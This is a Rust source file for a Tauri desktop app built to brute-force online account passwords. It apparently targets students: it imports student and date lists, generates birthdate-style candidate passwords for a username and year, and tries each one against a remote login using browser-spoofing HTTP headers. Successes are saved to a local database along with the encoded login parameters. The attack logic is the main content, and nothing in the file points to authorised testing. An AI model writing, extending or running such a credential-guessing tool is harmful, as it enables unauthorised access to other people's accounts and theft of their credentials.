mod db;
mod cracker;

use db::Database;
use cracker::{PasswordCracker, CrackProgress};
use serde::{Deserialize, Serialize};
use tauri::Emitter;
use std::sync::Arc;
use tokio::sync::Mutex;

#[derive(Serialize, Deserialize)]
struct CrackRequest {
    username: String,
    name: Option<String>,
    year: i32,
    concurrency: i32,
}

#[derive(Serialize)]
struct ImportSummary {
    inserted: usize,
    updated: usize,
}

#[tauri::command]
async fn crack_password(request: CrackRequest, window: tauri::Window) -> Result<String, String> {
    let db = Database::new("./password_results.db")
        .map_err(|e| format!("Failed to open database: {}", e))?;

    if let Ok(Some(existing)) = db.get_result_by_username(&request.username) {
        let existing_date = existing
            .password_date
            .as_deref()
            .unwrap_or("")
            .trim();
        if !existing_date.is_empty() {
            let progress = CrackProgress {
                current_password: existing.password_date.clone().unwrap_or_default(),
                total_attempted: 0,
                total_passwords: 0,
                found: true,
                result: Some(existing.password_date.clone().unwrap_or_default()),
                elapsed_seconds: 0,
            };
            let _ = window.emit("crack_progress", &progress);
            return Ok(format!("已存在记录，直接返回: {}", existing_date));
        }
    }

    let cracker = PasswordCracker::new(request.username.clone(), request.year);
    let passwords = cracker.generate_date_passwords();
    let total_passwords = passwords.len() as i32;

    let headers = [
        ("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"),
        ("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"),
        ("Accept-Language", "zh-CN,zh-TW;q=0.9,zh-HK;q=0.8,zh;q=0.7"),
    ];

    let mut default_headers = reqwest::header::HeaderMap::new();
    for (key, value) in &headers {
        let header_name = reqwest::header::HeaderName::from_bytes(key.as_bytes())
            .map_err(|e| format!("Invalid header name {}: {}", key, e))?;
        let header_value = reqwest::header::HeaderValue::from_str(value)
            .map_err(|e| format!("Invalid header value for {}: {}", key, e))?;
        default_headers.insert(header_name, header_value);
    }

    let client = reqwest::Client::builder()
        .default_headers(default_headers)
        .build()
        .map_err(|e| format!("Failed to create HTTP client: {}", e))?;

    let found = Arc::new(Mutex::new(false));
    let start_time = std::time::Instant::now();
    for (index, password) in passwords.iter().enumerate() {
        if *found.lock().await {
            break;
        }

        let current_attempt = (index + 1) as i32;

        match cracker.try_password(password, &client).await {
            Ok(success) => {
                if success {
                    *found.lock().await = true;
                    
                    let encoded_value = cracker.encode_login_params(password);
                    let _ = db.insert_result(
                        &request.username,
                        request.name.as_deref().unwrap_or(""),
                        "",
                        password,
                        &encoded_value,
                        request.year,
                    );

                    let progress = CrackProgress {
                        current_password: password.clone(),
                        total_attempted: current_attempt,
                        total_passwords,
                        found: true,
                        result: Some(password.clone()),
                        elapsed_seconds: start_time.elapsed().as_secs() as i32,
                    };

                    let _ = window.emit("crack_progress", &progress);
                    return Ok(format!("查询成功: {}", password));
                }
            }
            Err(_) => {
                // 网络错误，继续尝试
            }
        }

        // 每尝试 10 个密码发送一次进度
        if index % 10 == 0 {
            let progress = CrackProgress {
                current_password: password.clone(),
                total_attempted: current_attempt,
                total_passwords,
                found: false,
                result: None,
                elapsed_seconds: start_time.elapsed().as_secs() as i32,
            };

            let _ = window.emit("crack_progress", &progress);
        }
    }

    if *found.lock().await {
        Ok("查询成功".to_string())
    } else {
        Ok(format!("未查询到结果，共尝试 {} 次", total_passwords))
    }
}

#[tauri::command]
fn get_crack_history() -> Result<Vec<db::PasswordResult>, String> {
    let db = Database::new("./password_results.db")
        .map_err(|e| format!("Failed to open database: {}", e))?;

    db.get_all_results()
        .map_err(|e| format!("Failed to query database: {}", e))
}

#[tauri::command]
fn import_students(students: Vec<db::StudentImport>) -> Result<ImportSummary, String> {
    let mut db = Database::new("./password_results.db")
        .map_err(|e| format!("Failed to open database: {}", e))?;

    let (inserted, updated) = db
        .upsert_students(&students)
        .map_err(|e| format!("Failed to import students: {}", e))?;

    Ok(ImportSummary { inserted, updated })
}

#[tauri::command]
fn import_dates(dates: Vec<db::DateImport>) -> Result<ImportSummary, String> {
    let mut db = Database::new("./password_results.db")
        .map_err(|e| format!("Failed to open database: {}", e))?;

    let (inserted, updated) = db
        .upsert_dates(&dates)
        .map_err(|e| format!("Failed to import dates: {}", e))?;

    Ok(ImportSummary { inserted, updated })
}

#[tauri::command]
fn greet(name: &str) -> String {
    format!("Hello, {}! You've been greeted from Rust!", name)
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    tauri::Builder::default()
        .plugin(tauri_plugin_opener::init())
        .invoke_handler(tauri::generate_handler![
            greet,
            crack_password,
            get_crack_history,
            import_students,
            import_dates
        ])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
